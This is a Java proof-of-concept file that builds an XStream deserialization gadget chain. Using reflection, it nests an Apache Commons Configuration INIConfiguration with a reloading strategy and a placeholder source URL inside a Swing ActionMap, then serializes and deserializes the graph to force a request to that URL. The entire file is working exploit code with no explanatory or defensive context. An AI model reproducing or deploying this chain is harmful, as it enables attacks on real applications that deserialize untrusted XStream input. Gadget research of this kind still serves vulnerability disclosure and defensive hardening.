package com.example.CC;

import com.example.Utils.*;
import org.apache.commons.configuration.INIConfiguration;
import org.apache.commons.configuration.Lock;
import org.apache.commons.configuration.reloading.FileChangedReloadingStrategy;
import org.apache.commons.logging.impl.NoOpLog;

import javax.management.BadAttributeValueExpException;
import javax.swing.*;
import javax.swing.text.DefaultEditorKit;
import java.net.URL;

public class POC_2 {

    /***
     * run with actionMap_equals.jar
     */


    public static void main(String[] args) throws Exception {
        INIConfiguration fc = new INIConfiguration();
        FileChangedReloadingStrategy strategy = new FileChangedReloadingStrategy();
        ReflectionUtil.setField(strategy, "reloading", true);

        ReflectionUtil.setField(fc, "strategy", strategy);
        ReflectionUtil.setField(fc, "log", new NoOpLog());
        URL url = new URL("http://xxx");
        ReflectionUtil.setField(fc, "sourceURL", url);
        ReflectionUtil.setField(fc, "reloadLock", new Lock("AbstractFileConfiguration"));
        ReflectionUtil.setField(fc, "lockDetailEventsCount", new Object());
        ReflectionUtil.setField(fc, "detailEvents", -1);

        Object configuration1 = ReflectionUtil.createWithoutConstructor(Class.forName("org.apache.commons.configuration.ConfigurationMap$ConfigurationSet"));
        ReflectionUtil.setField(configuration1, "configuration", fc);
        Object configuration2 = ReflectionUtil.createWithoutConstructor(Class.forName("org.apache.commons.configuration.ConfigurationMap$ConfigurationSet"));
        ReflectionUtil.setField(configuration2, "configuration", fc);

        ActionMap map = new ActionMap();
        DefaultEditorKit.BeepAction action = new DefaultEditorKit.BeepAction();

        Object arrayTable = ReflectionUtil.createWithoutConstructor(Class.forName("javax.swing.ArrayTable"));
        Object[] table = new Object[]{configuration1, action, configuration2, action};

        ReflectionUtil.setField(arrayTable, "table", table);
        ReflectionUtil.setField(map, "arrayTable", arrayTable);

        XStreamUtil.deserialize(XStreamUtil.serialize(map));
    }

}
